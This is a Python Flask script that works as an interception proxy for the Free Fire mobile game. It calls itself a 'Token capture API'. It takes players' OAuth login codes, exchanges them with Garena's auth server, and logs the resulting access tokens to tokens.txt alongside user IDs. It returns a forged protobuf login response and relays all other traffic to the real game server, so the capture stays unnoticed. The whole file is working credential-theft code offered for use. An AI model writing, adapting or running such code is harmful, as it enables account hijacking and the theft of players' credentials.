from flask import Flask, request, jsonify, Response
import requests
import os
import re
import json
import base64
from datetime import datetime
import MajorLoginReq_pb2
import MajorLoginRes_pb2

app = Flask(__name__)

# ─── CONFIGURATION ──────────────────────────────────────────────
REAL_SERVER = os.environ.get('REAL_SERVER_URL', 'https://client.ind.freefiremobile.com')
TOKEN_URL = "https://auth.garena.com/oauth/token"
CLIENT_ID = "100067"

# List of possible redirect_uri values – we'll try each until one works
REDIRECT_URIS = [
    "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/",
    "https://shop.garena.sg/app/100067/idlogin",
    "https://gameskharido.in/app/100067/idlogin",
    "https://shop2game.com/app/100067/login",
    "https://api.ff.garena.co.id/auth/auth/callback_n",
]

active_users = []
# ─────────────────────────────────────────────────────────────────

def decode_jwt_payload(jwt):
    """Decode the JWT payload (without verifying signature) to get account info."""
    try:
        parts = jwt.split('.')
        if len(parts) != 3:
            return {}
        payload = parts[1]
        # Add padding if needed
        payload += '=' * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        print(f"JWT decode error: {e}")
        return {}

def exchange_code_for_tokens(code):
    """Try exchanging the OAuth code with multiple redirect_uri values."""
    for uri in REDIRECT_URIS:
        payload = {
            "grant_type": "authorization_code",
            "code": code,
            "client_id": CLIENT_ID,
            "redirect_uri": uri
        }
        try:
            resp = requests.post(TOKEN_URL, data=payload, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                hex_token = data.get('access_token')
                jwt_token = data.get('token')
                if hex_token and jwt_token:
                    print(f"✅ Exchange successful with redirect_uri: {uri}")
                    return hex_token, jwt_token
            else:
                print(f"❌ Exchange failed with {uri}: {resp.status_code}")
        except Exception as e:
            print(f"⚠️ Error with {uri}: {e}")
    return None, None

def build_login_response(hex_token, jwt_token, account_id, region):
    """Build a MajorLoginRes protobuf message with the required fields."""
    res = MajorLoginRes_pb2.MajorLoginRes()
    res.account_id = int(account_id) if account_id else 0
    res.token = jwt_token
    res.ttl = 28800
    res.server_url = REAL_SERVER
    res.lock_region = region or "IND"
    res.noti_region = region or "IND"
    res.ip_region = region or "IND"
    res.agora_environment = "live"
    # Set ak and aiv to dummy values (they are bytes)
    res.ak = b"dummy_ak"
    res.aiv = b"dummy_aiv"
    return res

# ─── ROUTES ─────────────────────────────────────────────────────
@app.route('/user/<user_id>/', defaults={'subpath': ''}, methods=['GET', 'POST'])
@app.route('/user/<user_id>/<path:subpath>', methods=['GET', 'POST'])
def handle_request(user_id, subpath):
    print(f"\n🔹 {request.method} /user/{user_id}/{subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        # Parse the request as MajorLoginReq
        try:
            login_req = MajorLoginReq_pb2.MajorLogin()
            login_req.ParseFromString(raw_data)
            print(f"✅ Parsed MajorLoginReq successfully.")
            oauth_code = login_req.access_token
            print(f"🔑 Extracted OAuth code: {oauth_code[:20]}...")
        except Exception as e:
            print(f"❌ Failed to parse MajorLoginReq: {e}")
            oauth_code = None

        if oauth_code:
            hex_token, jwt_token = exchange_code_for_tokens(oauth_code)
            if hex_token and jwt_token:
                print(f"🎯 HEX ACCESS TOKEN: {hex_token}")
                # Save hex token to file
                with open("tokens.txt", "a") as f:
                    f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")

                # Decode JWT to get account info for the response
                payload = decode_jwt_payload(jwt_token)
                account_id = payload.get('account_id', '')
                nickname_b64 = payload.get('nickname', '')
                if nickname_b64:
                    try:
                        nickname = base64.b64decode(nickname_b64).decode('utf-8')
                    except:
                        nickname = "Player"
                else:
                    nickname = "Player"
                region = payload.get('country_code', 'IND')

                # Build the protobuf response
                res = build_login_response(hex_token, jwt_token, account_id, region)
                response_data = res.SerializeToString()
                print(f"📤 Returning protobuf response of {len(response_data)} bytes")
                # Return the protobuf response
                return Response(response_data, status=200, mimetype='application/x-protobuf')
            else:
                print("❌ Failed to exchange OAuth code.")
        else:
            print("⚠️ No OAuth code found in request.")

        # If we reach here, something went wrong – return a generic success JSON
        return jsonify({"status": "success", "message": "OK"}), 200

    # Forward other requests to the real Garena server
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)